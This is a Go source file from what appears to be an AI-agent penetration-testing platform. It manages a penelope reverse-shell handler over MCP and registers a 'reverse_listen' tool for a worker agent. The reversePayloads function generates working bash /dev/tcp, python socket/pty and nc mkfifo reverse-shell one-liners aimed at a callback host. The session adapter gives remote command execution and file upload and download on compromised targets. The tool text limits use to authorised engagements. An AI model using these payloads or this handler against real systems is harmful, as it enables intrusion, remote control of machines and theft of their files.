// reverse.go 装配 reverse 反弹 shell handler(内网渗透期 5,INTRANET-PIVOT-DESIGN.md
// §4.3a 受管资源原则 + 期 5):受管 penelope 进程(--mcp 本地 token 认证、自动 PTY
// 升级、会话日志落盘)+ MCP 桥(把 penelope 会话同步进 sessions 台账 kind="reverse"
// 与进程内 Registry)+ reverse_listen 工具。同步后 session_exec/session_read/
// session_write 与内网页会话面板自动可用,无需改前端。
//
// penelope MCP API 结论(2026-09-13 测试机实测 + penelope.py MCPServer 源码):
//   - 端点 POST /(GET 405);Authorization: Bearer <token>(hmac.compare_digest,
//     无/错 token 401);响应是普通 application/json(非 SSE);不派发 Mcp-Session-Id;
//     协议版本 2025-06-18(兼容 2025-03-26/2024-11-05);notification 回 202。
//   - 工具 6 个,结果均为单 text block 内嵌 JSON(isError 时 text 为 "Error: …"):
//     list_sessions{} → {"sessions":[{id,name,ip,port,OS,type,user,source}]}
//     get_session_info{session_id} → 另含 hostname/system/arch/cwd
//     exec_in_session{session_id,command} → {"output":"…"}(stdout/stderr 已合并)
//     kill_session{session_id} → {"ok":true}
//     upload_to_session{session_id,local_path,remote_path?} → {"uploaded":[…]},
//       remote_path 必须是【目录】(默认会话 cwd),文件名取本地文件 basename
//     download_from_session{session_id,remote_path} → {"downloaded":[本地绝对路径]},
//       落 ~/.penelope/sessions/<name>/downloads/ 下
//   - 文件传输要求持久 shell(agent 或 auto-upgrade 后的 PTY),否则返回 error;
//     未知会话是 JSON-RPC -32602;会话死亡即从 list_sessions 消失(watchdog 依据)。
//   - penelope 无回连口令:监听默认只绑 127.0.0.1,目标直连回连时 reverse_listen
//     需显式 iface;加密不指望它(走加密马/隧道)。
package server

import (
	"context"
	"crypto/rand"
	"encoding/hex"
	"encoding/json"
	"fmt"
	"log"
	"net"
	"os"
	"os/exec"
	"path/filepath"
	"runtime"
	"strings"
	"sync"
	"time"

	"github.com/Autumn-27/artex/agent"
	"github.com/Autumn-27/artex/db"
	"github.com/Autumn-27/artex/mcphttp"
	"github.com/Autumn-27/artex/session"
	actool "github.com/Autumn-27/norma/tool"
)

// reverseSyncInterval 是 handler 存活期间会话同步(watchdog)的轮询间隔。
const reverseSyncInterval = 10 * time.Second

// reverseStartTimeout 是等 penelope 的 MCP/监听端口就绪的上限。
const reverseStartTimeout = 15 * time.Second

// defaultReversePort 是 reverse_listen 未指定 port 时的默认反弹监听口。
const defaultReversePort = 4444

// mcpCaller 是 reverseShell 依赖的最小 MCP 调用面(*mcphttp.Client 满足;
// 单测注入假实现)。
type mcpCaller interface {
	Call(ctx context.Context, tool string, args any) (string, error)
}

// penSession 是 penelope list_sessions/get_session_info 一条会话的投影。
type penSession struct {
	ID       int    `json:"id"`
	Name     string `json:"name"`
	IP       string `json:"ip"`
	Port     int    `json:"port"`
	OS       string `json:"OS"`
	Type     string `json:"type"`
	User     string `json:"user"`
	Source   string `json:"source"`
	Hostname string `json:"hostname,omitempty"`
	System   string `json:"system,omitempty"`
	Arch     string `json:"arch,omitempty"`
	CWD      string `json:"cwd,omitempty"`
}

// reverseSecret 是 kind=reverse 会话落库 secret 的结构(AES-GCM 加密存储):
// penelope 会话标识 + 当前 handler 的 MCP 接入参数(诊断/对账用,恢复不支持——
// penelope 会话活在它进程内存里,平台重启后经 initReverse 诚实标 dead)。
type reverseSecret struct {
	PenelopeID int    `json:"penelope_id"`
	Name       string `json:"name"`
	MCPURL     string `json:"mcp_url"`
	Token      string `json:"token"`
}

// --- 内嵌 JSON text block 解析(纯函数,可测) ---

// parsePenSessions 解析 list_sessions 的 text block。
func parsePenSessions(text string) ([]penSession, error) {
	var res struct {
		Sessions []penSession `json:"sessions"`
	}
	if err := json.Unmarshal([]byte(text), &res); err != nil {
		return nil, fmt.Errorf("list_sessions 返回解析失败: %w", err)
	}
	return res.Sessions, nil
}

// parsePenInfo 解析 get_session_info 的 text block。
func parsePenInfo(text string) (*penSession, error) {
	var ps penSession
	if err := json.Unmarshal([]byte(text), &ps); err != nil {
		return nil, fmt.Errorf("get_session_info 返回解析失败: %w", err)
	}
	return &ps, nil
}

// parseExecOutput 解析 exec_in_session 的 text block:{"output":…} 或 {"error":…}。
func parseExecOutput(text string) (string, error) {
	var res struct {
		Output string `json:"output"`
		Error  string `json:"error"`
	}
	if err := json.Unmarshal([]byte(text), &res); err != nil {
		return "", fmt.Errorf("exec_in_session 返回解析失败: %w", err)
	}
	if res.Error != "" {
		return "", fmt.Errorf("%s", res.Error)
	}
	return res.Output, nil
}

// parseStringList 解析 {"downloaded":[…]}/{"uploaded":[…]} 这类单键字符串列表。
func parseStringList(key, text string) ([]string, error) {
	var res map[string]json.RawMessage
	if err := json.Unmarshal([]byte(text), &res); err != nil {
		return nil, fmt.Errorf("%s 返回解析失败: %w", key, err)
	}
	raw, ok := res[key]
	if !ok {
		return nil, fmt.Errorf("%s 返回缺 %q 键: %s", key, key, truncateOutput(text))
	}
	var out []string
	if err := json.Unmarshal(raw, &out); err != nil {
		return nil, fmt.Errorf("%s 列表解析失败: %w", key, err)
	}
	return out, nil
}

// splitRemotePath 拆目标侧绝对路径为(目录, basename):/a/b/c → (/a/b, c);
// 无目录部分时 dir 为空(= 会话 cwd)。仅 Unix 形态(reverse 期 5 面向 Unix 目标)。
func splitRemotePath(p string) (dir, base string) {
	p = strings.TrimSpace(p)
	i := strings.LastIndexByte(p, '/')
	if i < 0 {
		return "", p
	}
	if i == 0 {
		return "/", p[1:]
	}
	return p[:i], p[i+1:]
}

// diffPenSessions 对比 penelope 活会话 id 集与已登记映射(penID→dbID),返回需要
// 新登记的 id 与已消失(应标 dead)的映射。纯函数,可测。
func diffPenSessions(active []int, known map[int]int64) (newIDs []int, dead map[int]int64) {
	seen := map[int]bool{}
	for _, id := range active {
		seen[id] = true
		if _, ok := known[id]; !ok {
			newIDs = append(newIDs, id)
		}
	}
	dead = map[int]int64{}
	for id, dbID := range known {
		if !seen[id] {
			dead[id] = dbID
		}
	}
	return newIDs, dead
}

// reversePayloads 生成常用回连 payload(host=ARTEX_CALLBACK_ADDR 的主机部分)。
func reversePayloads(host string, port int) map[string]string {
	return map[string]string{
		"bash": fmt.Sprintf("bash -i >& /dev/tcp/%s/%d 0>&1", host, port),
		"python": fmt.Sprintf(`python3 -c 'import socket,os,pty;s=socket.socket();s.connect((%q,%d));[os.dup2(s.fileno(),f) for f in (0,1,2)];pty.spawn("/bin/bash")'`, host, port),
		"nc": fmt.Sprintf("rm -f /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc %s %d >/tmp/f", host, port),
	}
}

// --- PenelopeHandler:受管 penelope 进程(单例懒起) ---

// PenelopeHandler 是平台侧反弹 shell handler:受管拉起的 penelope 长寿命进程
// (受管资源原则:进程/端口/日志全部登记台账,平台回收)。MCP 只绑 127.0.0.1 +
// 随机 Bearer token;反弹监听口登记端口审计台账。
type PenelopeHandler struct {
	bgCtx   context.Context // server 生命周期 ctx(同步循环/退出清理用)
	dataDir string
	binPath string
	python  string
	store   *db.SessionStore
	reg     *session.Registry

	mu          sync.Mutex
	cmd         *exec.Cmd
	mcp         *mcphttp.Client
	mcpURL      string
	token       string
	mcpPort     int
	listenPort  int
	listenIface string
	running     bool
	taskID      int64
	intentID    int64
	pen         map[int]int64 // penelope 会话 id → sessions 表 id
	syncStop    context.CancelFunc
}

// newPenelopeHandler 构造 handler(不起进程)。binPath 解析:ARTEX_PENELOPE_PATH >
// dataDir/tools/penelope.py;python 解释器:ARTEX_PENELOPE_PYTHON > python3。
func newPenelopeHandler(bgCtx context.Context, dataDir string, store *db.SessionStore, reg *session.Registry) *PenelopeHandler {
	binPath := strings.TrimSpace(os.Getenv("ARTEX_PENELOPE_PATH"))
	if binPath == "" {
		binPath = filepath.Join(dataDir, "tools", "penelope.py")
	}
	python := strings.TrimSpace(os.Getenv("ARTEX_PENELOPE_PYTHON"))
	if python == "" {
		python = "python3"
	}
	return &PenelopeHandler{
		bgCtx: bgCtx, dataDir: dataDir, binPath: binPath, python: python,
		store: store, reg: reg, pen: map[int]int64{},
	}
}

// logPath 是本 handler 进程日志(台账:日志文件落 dataDir/reverse/)。
func (h *PenelopeHandler) logPath(port int) string {
	return filepath.Join(h.dataDir, "reverse", fmt.Sprintf("penelope-%d.log", port))
}

// ensure 单例懒起:已运行且监听参数一致直接返回;参数不一致报带现状的错(单
// handler 单监听口,不悄悄换端口)。进程死亡后经 onExit 清理,下次 ensure 重起
// (死亡重生:会话不装活,重生=让目标再次回连)。
func (h *PenelopeHandler) ensure(ctx context.Context, listenPort int, iface string, taskID, intentID int64) error {
	h.mu.Lock()
	if h.running {
		if listenPort != h.listenPort || iface != h.listenIface {
			cur1, cur2 := h.listenPort, h.listenIface
			h.mu.Unlock()
			return fmt.Errorf("penelope handler 已在 %s:%d 监听(单例 handler 不支持多监听口);"+
				"直接用该端口回连,或先重启平台再换端口", cur2, cur1)
		}
		h.taskID, h.intentID = taskID, intentID
		h.mu.Unlock()
		return nil
	}
	h.mu.Unlock()

	if _, err := os.Stat(h.binPath); err != nil {
		return fmt.Errorf("penelope 未安装:预期路径 %s(%v);把 penelope.py 放到该路径或设 ARTEX_PENELOPE_PATH", h.binPath, err)
	}
	// MCP 端口:挑一个空闲 loopback 端口(先占后放,penelope 随即绑定;竞态窗口可接受)。
	mcpPort, err := freeLoopbackPort()
	if err != nil {
		return err
	}
	tokenBuf := make([]byte, 24)
	if _, err := rand.Read(tokenBuf); err != nil {
		return fmt.Errorf("MCP token 生成失败: %w", err)
	}
	token := hex.EncodeToString(tokenBuf)

	if err := os.MkdirAll(filepath.Join(h.dataDir, "reverse"), 0o700); err != nil {
		return fmt.Errorf("handler 日志目录创建失败: %w", err)
	}
	logFile, err := os.OpenFile(h.logPath(listenPort), os.O_CREATE|os.O_WRONLY|os.O_APPEND, 0o600)
	if err != nil {
		return fmt.Errorf("handler 日志文件创建失败: %w", err)
	}

	args := []string{h.binPath,
		"--mcp", "--mcp-host", "127.0.0.1", "--mcp-port", fmt.Sprint(mcpPort), "--mcp-token", token,
		"-p", fmt.Sprint(listenPort), "-i", iface,
		"-C", // no-attach:无 TTY,新会话不进入交互菜单(菜单会消费 stdin)
	}
	cmd := exec.Command(h.python, args...)
	cmd.Stdout, cmd.Stderr = logFile, logFile
	if err := cmd.Start(); err != nil {
		_ = logFile.Close()
		return fmt.Errorf("penelope 拉起失败(%s %s): %w", h.python, h.binPath, err)
	}

	h.mu.Lock()
	h.cmd, h.token, h.mcpPort = cmd, token, mcpPort
	h.listenPort, h.listenIface = listenPort, iface
	h.mcpURL = fmt.Sprintf("http://127.0.0.1:%d/", mcpPort)
	h.taskID, h.intentID = taskID, intentID
	h.pen = map[int]int64{}
	h.running = true
	h.mu.Unlock()

	// 进程看护:退出即清理台账(端口注销、会话诚实标 dead),不装活。
	go func() {
		err := cmd.Wait()
		_ = logFile.Close()
		h.onExit(err)
	}()

	// 等 MCP 就绪 + 监听口真实绑定(绑定失败=端口被占,诚实报错不假装在听)。
	if err := h.waitReady(ctx, listenPort, iface); err != nil {
		_ = cmd.Process.Kill()
		return err
	}
	registerManagedPort(listenPort)
	registerManagedPort(mcpPort)

	syncCtx, cancel := context.WithCancel(h.bgCtx)
	h.mu.Lock()
	h.syncStop = cancel
	h.mu.Unlock()
	go h.syncLoop(syncCtx)
	log.Printf("[reverse] penelope handler 已起:监听 %s:%d,MCP 127.0.0.1:%d,日志 %s",
		iface, listenPort, mcpPort, h.logPath(listenPort))
	return nil
}

// waitReady 轮询 MCP initialize 与监听口绑定,直到就绪或超时/进程退出。
func (h *PenelopeHandler) waitReady(ctx context.Context, listenPort int, iface string) error {
	logPath := h.logPath(listenPort)
	deadline := time.Now().Add(reverseStartTimeout)
	for time.Now().Before(deadline) {
		h.mu.Lock()
		running := h.running
		h.mu.Unlock()
		if !running {
			return fmt.Errorf("penelope 启动后退出,日志: %s", logPath)
		}
		if _, err := h.connectMCP(ctx); err == nil {
			if h.listenerBound() {
				return nil
			}
			// MCP 已起但监听口还没绑上:继续等;超时后按绑定失败处理。
		}
		select {
		case <-ctx.Done():
			return ctx.Err()
		case <-time.After(300 * time.Millisecond):
		}
	}
	if _, err := h.connectMCP(ctx); err != nil {
		return fmt.Errorf("penelope MCP %v 内未就绪: %w(日志: %s)", reverseStartTimeout, err, logPath)
	}
	return fmt.Errorf("penelope 未能在 %s:%d 监听(端口被占?),日志: %s", iface, listenPort, logPath)
}

// listenerBound 核对反弹监听口已真实 LISTEN(复用 portaudit 的 /proc 解析;
// 非 Linux 平台无法核对,放行——MCP 可用已是最低健康线)。
func (h *PenelopeHandler) listenerBound() bool {
	if runtime.GOOS != "linux" {
		return true
	}
	h.mu.Lock()
	port := h.listenPort
	h.mu.Unlock()
	for _, path := range []string{"/proc/net/tcp", "/proc/net/tcp6"} {
		data, err := os.ReadFile(path)
		if err != nil {
			continue
		}
		for _, ls := range parseProcNetTCP(string(data)) {
			if ls.Port == port {
				return true
			}
		}
	}
	return false
}

// connectMCP 建(或重建)MCP 客户端(initialize 握手)。
func (h *PenelopeHandler) connectMCP(ctx context.Context) (*mcphttp.Client, error) {
	h.mu.Lock()
	url, token := h.mcpURL, h.token
	h.mu.Unlock()
	if url == "" {
		return nil, fmt.Errorf("handler 未启动")
	}
	mc, err := mcphttp.New(ctx, "penelope", url, map[string]string{"Authorization": "Bearer " + token}, false)
	if err != nil {
		return nil, err
	}
	h.mu.Lock()
	if h.mcp != nil && h.mcp != mc {
		_ = h.mcp.Close()
	}
	h.mcp = mc
	h.mu.Unlock()
	return mc, nil
}

// mcpCall 调一次 penelope MCP 工具;连接类错误(进程重启后旧 client 失效)重建
// 客户端重试一次。
func (h *PenelopeHandler) mcpCall(ctx context.Context, tool string, args any) (string, error) {
	h.mu.Lock()
	mc := h.mcp
	h.mu.Unlock()
	if mc == nil {
		return "", fmt.Errorf("penelope MCP 未连接(handler 未启动?)")
	}
	out, err := mc.Call(ctx, tool, args)
	if err == nil {
		return out, nil
	}
	nm, nerr := h.connectMCP(ctx)
	if nerr != nil {
		return "", err // 重连失败,报原始错误(带工具语义)
	}
	return nm.Call(ctx, tool, args)
}

// onExit 进程退出清理:注销端口台账、停同步循环、全部已登记会话诚实标 dead。
func (h *PenelopeHandler) onExit(waitErr error) {
	h.mu.Lock()
	if !h.running {
		h.mu.Unlock()
		return
	}
	h.running = false
	listenPort, mcpPort := h.listenPort, h.mcpPort
	dead := make([]int64, 0, len(h.pen))
	for _, dbID := range h.pen {
		dead = append(dead, dbID)
	}
	h.pen = map[int]int64{}
	if h.syncStop != nil {
		h.syncStop()
		h.syncStop = nil
	}
	mc := h.mcp
	h.mcp = nil
	h.mu.Unlock()

	unregisterManagedPort(listenPort)
	unregisterManagedPort(mcpPort)
	if mc != nil {
		_ = mc.Close()
	}
	for _, dbID := range dead {
		if err := h.store.UpdateStatus(h.bgCtx, dbID, db.SessionDead); err != nil {
			log.Printf("[reverse] 会话 %d 标 dead 失败: %v", dbID, err)
		}
		h.reg.Remove(dbID)
	}
	log.Printf("[reverse] penelope handler 退出(%v),%d 条会话标 dead;下次 reverse_listen 自动重起",
		waitErr, len(dead))
}

// close 平台退出时回收受管进程(受管资源原则:平台回收,不留孤儿)。
func (h *PenelopeHandler) close() {
	h.mu.Lock()
	cmd, running := h.cmd, h.running
	h.mu.Unlock()
	if !running || cmd == nil || cmd.Process == nil {
		return
	}
	_ = cmd.Process.Kill() // 余下清理由 Wait 看护 goroutine(onExit)完成
}

// syncLoop 会话同步 watchdog:周期性 SyncSessions(新会话登记、消失会话标 dead)。
func (h *PenelopeHandler) syncLoop(ctx context.Context) {
	t := time.NewTicker(reverseSyncInterval)
	defer t.Stop()
	for {
		select {
		case <-ctx.Done():
			return
		case <-t.C:
			if _, err := h.SyncSessions(ctx); err != nil {
				log.Printf("[reverse] 会话同步失败: %v", err)
			}
		}
	}
}

// SyncSessions 对账 penelope 会话与 sessions 台账:新会话落库 + 注册进 Registry
// (kind="reverse");消失会话标 dead 并移出 Registry。返回当前活会话数。
func (h *PenelopeHandler) SyncSessions(ctx context.Context) (int, error) {
	out, err := h.mcpCall(ctx, "list_sessions", map[string]any{})
	if err != nil {
		return 0, fmt.Errorf("list_sessions: %w", err)
	}
	sessions, err := parsePenSessions(out)
	if err != nil {
		return 0, err
	}
	active := make([]int, 0, len(sessions))
	for _, ps := range sessions {
		active = append(active, ps.ID)
	}
	h.mu.Lock()
	newIDs, dead := diffPenSessions(active, h.pen)
	h.mu.Unlock()

	for penID, dbID := range dead {
		if err := h.store.UpdateStatus(ctx, dbID, db.SessionDead); err != nil {
			log.Printf("[reverse] 会话 %d 标 dead 失败: %v", dbID, err)
		}
		h.reg.Remove(dbID)
		h.mu.Lock()
		delete(h.pen, penID)
		h.mu.Unlock()
		log.Printf("[reverse] 会话 %d(penelope #%d)已消失,台账标 dead", dbID, penID)
	}
	for _, penID := range newIDs {
		if err := h.registerPenSession(ctx, penID); err != nil {
			log.Printf("[reverse] penelope 会话 #%d 登记失败: %v", penID, err)
		}
	}
	h.mu.Lock()
	n := len(h.pen)
	h.mu.Unlock()
	return n, nil
}

// registerPenSession 取会话详情 → 落库(kind=reverse)→ Session 适配器进 Registry。
func (h *PenelopeHandler) registerPenSession(ctx context.Context, penID int) error {
	out, err := h.mcpCall(ctx, "get_session_info", map[string]any{"session_id": penID})
	if err != nil {
		return fmt.Errorf("get_session_info: %w", err)
	}
	ps, err := parsePenInfo(out)
	if err != nil {
		return err
	}
	h.mu.Lock()
	token, mcpURL := h.token, h.mcpURL
	taskID, intentID := h.taskID, h.intentID
	h.mu.Unlock()
	secret, _ := json.Marshal(reverseSecret{PenelopeID: ps.ID, Name: ps.Name, MCPURL: mcpURL, Token: token})
	lang := strings.ToLower(ps.System)
	if lang == "" {
		lang = strings.ToLower(ps.OS)
	}
	rec := &db.SessionRecord{
		Kind:  "reverse",
		URL:   fmt.Sprintf("reverse://%s", net.JoinHostPort(ps.IP, fmt.Sprint(ps.Port))),
		Lang:  lang,
		Secret: secret,
		Status: db.SessionAlive, CreatedByTask: taskID, CreatedByIntent: intentID,
	}
	dbID, err := h.store.Create(ctx, rec)
	if err != nil {
		return fmt.Errorf("落库失败: %w", err)
	}
	sh := &reverseShell{
		id: dbID, penID: ps.ID, name: ps.Name,
		user: ps.User, os: ps.OS, caller: h.mcpCallerFunc(),
	}
	h.reg.Add(sh)
	h.mu.Lock()
	h.pen[ps.ID] = dbID
	h.mu.Unlock()
	log.Printf("[reverse] 新会话登记:db #%d ← penelope #%d %s %s@%s(%s %s)",
		dbID, ps.ID, ps.Name, ps.User, ps.IP, ps.OS, ps.Arch)
	return nil
}

// mcpCallerFunc 把 handler 的 mcpCall 包成 mcpCaller(reverseShell 持有函数值,
// 不反向引用 handler,便于单测注入假实现)。
func (h *PenelopeHandler) mcpCallerFunc() mcpCaller {
	return mcpCallerFunc(h.mcpCall)
}

type mcpCallerFunc func(ctx context.Context, tool string, args any) (string, error)

func (f mcpCallerFunc) Call(ctx context.Context, tool string, args any) (string, error) {
	return f(ctx, tool, args)
}

// freeLoopbackPort 挑一个空闲 loopback TCP 端口(先占后放)。
func freeLoopbackPort() (int, error) {
	l, err := net.Listen("tcp", "127.0.0.1:0")
	if err != nil {
		return 0, fmt.Errorf("空闲 MCP 端口分配失败: %w", err)
	}
	defer l.Close()
	return l.Addr().(*net.TCPAddr).Port, nil
}

// --- reverseShell:Session 接口适配器(经 penelope MCP 操作目标侧) ---

// reverseShell 把一条 penelope 反弹会话适配成 session.Session:Exec 经
// exec_in_session;ReadFile 经 download_from_session(penelope 落本地后读回);
// WriteFile 经 upload_to_session(先写本地临时文件,remote_path 必须是目录)。
type reverseShell struct {
	id     int64
	penID  int
	name   string
	user   string
	os     string
	caller mcpCaller

	execMu sync.Mutex // 同会话执行串行:shell 有状态(cwd),并发 exec 会串台
}

func (sh *reverseShell) ID() int64    { return sh.id }
func (sh *reverseShell) Kind() string { return "reverse" }

// Test 连通性探测:echo 哨兵,回显含哨兵才算活。
func (sh *reverseShell) Test(ctx context.Context) error {
	sentinel := "artex_pen_" + hex.EncodeToString(func() []byte { b := make([]byte, 6); _, _ = rand.Read(b); return b }())
	stdout, _, err := sh.Exec(ctx, "echo "+sentinel, 10*time.Second)
	if err != nil {
		return err
	}
	if !strings.Contains(stdout, sentinel) {
		return fmt.Errorf("session test: 哨兵未回显(会话可能已死或被劫持)")
	}
	return nil
}

// Exec 经 exec_in_session 在目标侧执行。penelope 通道 stdout/stderr 已合并,
// stderr 恒为空(与 Session 契约一致)。超时只断 HTTP 等待——penelope 侧命令
// 仍在跑,下条命令输出可能带残余,调用方应避免长命令(已在工具描述说明)。
func (sh *reverseShell) Exec(ctx context.Context, cmd string, timeout time.Duration) (stdout, stderr string, err error) {
	if timeout <= 0 {
		timeout = 30 * time.Second
	}
	ctx, cancel := context.WithTimeout(ctx, timeout)
	defer cancel()
	sh.execMu.Lock()
	defer sh.execMu.Unlock()
	out, err := sh.caller.Call(ctx, "exec_in_session", map[string]any{
		"session_id": sh.penID, "command": cmd,
	})
	if err != nil {
		return "", "", fmt.Errorf("session exec: %w", err)
	}
	stdout, err = parseExecOutput(out)
	if err != nil {
		return "", "", fmt.Errorf("session exec: %w", err)
	}
	return stdout, "", nil
}

// ReadFile 经 download_from_session:penelope 把目标侧文件拉到本地
// (~/.penelope/sessions/<name>/downloads/ 下)并返回本地绝对路径,读回字节。
// 非持久 shell(未 auto-upgrade)时 penelope 返回 error,如实上抛。
func (sh *reverseShell) ReadFile(ctx context.Context, path string) ([]byte, error) {
	sh.execMu.Lock()
	defer sh.execMu.Unlock()
	out, err := sh.caller.Call(ctx, "download_from_session", map[string]any{
		"session_id": sh.penID, "remote_path": path,
	})
	if err != nil {
		return nil, fmt.Errorf("session read: %w", err)
	}
	paths, err := parseStringList("downloaded", out)
	if err != nil {
		return nil, fmt.Errorf("session read: %w", err)
	}
	if len(paths) == 0 {
		return nil, fmt.Errorf("session read: penelope 未返回下载路径(目标侧无此文件?)")
	}
	if len(paths) > 1 {
		return nil, fmt.Errorf("session read: %q 匹配到 %d 个文件,请给精确路径", path, len(paths))
	}
	data, err := os.ReadFile(paths[0])
	if err != nil {
		return nil, fmt.Errorf("session read: 本地下载文件读取失败: %w", err)
	}
	return data, nil
}

// WriteFile 经 upload_to_session:先写本地临时文件(basename 必须与目标一致——
// penelope 上传保留本地文件名),remote_path 传目标目录(必须是目录,实测语义)。
func (sh *reverseShell) WriteFile(ctx context.Context, path string, data []byte) error {
	dir, base := splitRemotePath(path)
	if base == "" {
		return fmt.Errorf("session write: 非法目标路径 %q", path)
	}
	tmpDir, err := os.MkdirTemp("", "artex-reverse-up-*")
	if err != nil {
		return fmt.Errorf("session write: 本地暂存目录创建失败: %w", err)
	}
	defer os.RemoveAll(tmpDir)
	local := filepath.Join(tmpDir, base)
	if err := os.WriteFile(local, data, 0o600); err != nil {
		return fmt.Errorf("session write: 本地暂存失败: %w", err)
	}
	args := map[string]any{"session_id": sh.penID, "local_path": local}
	if dir != "" {
		args["remote_path"] = dir
	}
	sh.execMu.Lock()
	defer sh.execMu.Unlock()
	out, err := sh.caller.Call(ctx, "upload_to_session", args)
	if err != nil {
		return fmt.Errorf("session write: %w", err)
	}
	uploaded, err := parseStringList("uploaded", out)
	if err != nil {
		return fmt.Errorf("session write: %w", err)
	}
	if len(uploaded) == 0 {
		return fmt.Errorf("session write: penelope 上传为空(目标目录不可写/非持久 shell?)")
	}
	return nil
}

// Close 尽力 kill_session(会话可能已死,错误吞掉——Registry 清理语义)。
func (sh *reverseShell) Close(ctx context.Context) error {
	_, _ = sh.caller.Call(ctx, "kill_session", map[string]any{"session_id": sh.penID})
	return nil
}

// --- init/seed/工具装配 ---

// initReverse 建反弹 handler(单例,懒起进程)。平台重启 = 上期 penelope 的 MCP
// token/端口随进程丢失,存活 reverse 会话不可恢复:诚实标 dead(不装活),重生
// 交给下次 reverse_listen。失败只记日志,不拖垮启动。
func (s *Server) initReverse(dataDir string) {
	if s.m.pg == nil || s.sessReg == nil || s.sessStore == nil {
		return
	}
	recs, err := s.sessStore.List(s.ctx, db.SessionAlive)
	if err != nil {
		log.Printf("[reverse] 启动清理读取失败: %v", err)
	} else {
		marked := 0
		for _, rec := range recs {
			if rec.Kind != "reverse" {
				continue
			}
			if err := s.sessStore.UpdateStatus(s.ctx, rec.ID, db.SessionDead); err == nil {
				marked++
			}
		}
		if marked > 0 {
			log.Printf("[reverse] 启动清理:%d 条上期 reverse 会话标 dead(MCP 接入参数随进程丢失,不可恢复)", marked)
		}
	}
	s.reverse = newPenelopeHandler(s.ctx, dataDir, s.sessStore, s.sessReg)
	go func() { <-s.ctx.Done(); s.reverse.close() }()
}

// reverseTools 返回反弹监听工具。reverse 为 nil(DB 未就绪)时不提供。
func (s *Server) reverseTools() []actool.CoreTool {
	if s.reverse == nil {
		return nil
	}
	return []actool.CoreTool{s.reverseListenTool()}
}

// reverseListenTool 确保 handler + 监听端口存在,返回端口与常用回连 payload。
func (s *Server) reverseListenTool() actool.CoreTool {
	return actool.Build(actool.Spec{
		Name: "reverse_listen",
		Description: "【反弹 shell 监听·受管】确保平台侧 penelope 反弹 handler 在监听:单例懒起受管进程" +
			"(--mcp 仅绑 127.0.0.1 + 随机 Bearer token;自动 PTY 升级;会话日志落盘),监听口登记平台端口台账。" +
			"返回监听端口与 bash/python/nc 回连 payload(host=ARTEX_CALLBACK_ADDR 的回连地址)。让目标经 " +
			"session_exec 或漏洞触发 payload 回连;新会话自动同步进 sessions 台账(kind=reverse),之后用 " +
			"session_exec/session_read/session_write 操作(文件传输依赖 penelope 自动 PTY 升级,未升级成功的会话会报明确错误)," +
			"内网页会话面板可见。" +
			"【RoE】仅在授权任务范围内使用:penelope 无回连口令,监听默认只绑 127.0.0.1(配合隧道/本机回连);" +
			"目标直连回连必须显式 iface=0.0.0.0 或指定网卡 IP——监听是有外部暴露面的受管资源,用完的会话及时删除。" +
			"penelope 自身不加密(加密走加密马/隧道);会话死亡平台标 dead 不装活,重生=让目标再次回连。" +
			"长命令注意:Exec 超时只断平台侧等待,penelope 侧命令仍在跑。",
		Schema: map[string]any{
			"type": "object",
			"properties": map[string]any{
				"port":  map[string]any{"type": "integer", "description": "反弹监听端口(默认 4444;handler 已运行时必须与运行端口一致)"},
				"iface": strParam("监听网卡 IP(默认 127.0.0.1;目标直连回连传 0.0.0.0 或网卡 IP)"),
			},
		},
		ReadOnly:    func(json.RawMessage) bool { return false },
		Permissions: sessionPerm,
		Run: func(ctx context.Context, in json.RawMessage, _ *actool.ToolContext) (actool.Result, error) {
			var a struct {
				Port  int    `json:"port"`
				Iface string `json:"iface"`
			}
			_ = json.Unmarshal(in, &a)
			if a.Port <= 0 {
				a.Port = defaultReversePort
			}
			if a.Port > 65535 {
				return actool.Errorf(fmt.Sprintf("port 非法： %d", a.Port)), nil
			}
			a.Iface = strings.TrimSpace(a.Iface)
			if a.Iface == "" {
				a.Iface = "127.0.0.1"
			}
			if net.ParseIP(a.Iface) == nil {
				return actool.Errorf("iface 非法(需 IP): " + a.Iface), nil
			}
			host, err := callbackHost()
			if err != nil {
				return actool.Errorf(err.Error()), nil
			}
			ri := agent.RunInfoFrom(ctx)
			if err := s.reverse.ensure(ctx, a.Port, a.Iface, ri.TaskID, ri.IntentID); err != nil {
				return actool.Errorf("handler 启动失败：" + err.Error()), nil
			}
			// 立即对账一次(回连可能先于同步循环到达);失败不阻塞——同步循环会补。
			active, syncErr := s.reverse.SyncSessions(ctx)
			out := map[string]any{
				"listen_addr":    net.JoinHostPort(a.Iface, fmt.Sprint(a.Port)),
				"callback_host":  host,
				"callback_addr":  net.JoinHostPort(host, fmt.Sprint(a.Port)),
				"payloads":       reversePayloads(host, a.Port),
				"penelope_log":   s.reverse.logPath(a.Port),
				"active_reverse": active,
				"note": "让目标回连 callback_addr 后,新会话 10s 内自动进 sessions 台账(kind=reverse)并可用 session_exec 操作;" +
					"iface=127.0.0.1 时只有本机/隧道内回连能到达。",
			}
			if syncErr != nil {
				out["sync_warning"] = syncErr.Error()
			}
			return jsonResult(out)
		},
	})
}

// seedReverseTools 把 reverse_listen seed 进 tools 表、默认绑定 worker
// （与 sessionTools 同一套 SeedTool 首插入语义：老库的用户编辑不被覆盖）。
func (s *Server) seedReverseTools() {
	if s.reverse == nil {
		return
	}
	workerAgents, _ := json.Marshal([]string{"worker"})
	for _, t := range s.reverseTools() {
		schema, _ := json.Marshal(t.InputSchema())
		if err := s.m.PG().SeedTool(t.Name(), t.Description(), schema, workerAgents); err != nil {
			log.Printf("[tools] seed %s 失败： %v", t.Name(), err)
		}
	}
}
